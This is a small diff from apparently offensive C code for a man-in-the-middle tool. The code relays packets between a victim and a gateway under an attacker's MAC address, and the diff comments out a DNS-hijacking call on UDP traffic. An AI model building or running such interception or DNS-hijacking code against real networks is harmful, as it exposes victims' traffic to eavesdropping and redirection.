@@ -69,8 +69,8 @@ void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) 
         forward(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
     }
     else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
-        if (pIpv4->protocol_type == PROTOCOL_UDP)
-            DnshijackG(packet + 42, hp->len - 42);
+        //if (pIpv4->protocol_type == PROTOCOL_UDP)
+            //DnshijackG(packet + 42, hp->len - 42);
         forward(dev, type, victim_mac, attacker_mac, packet + 14, hp->len - 14, Times);
     }
 }
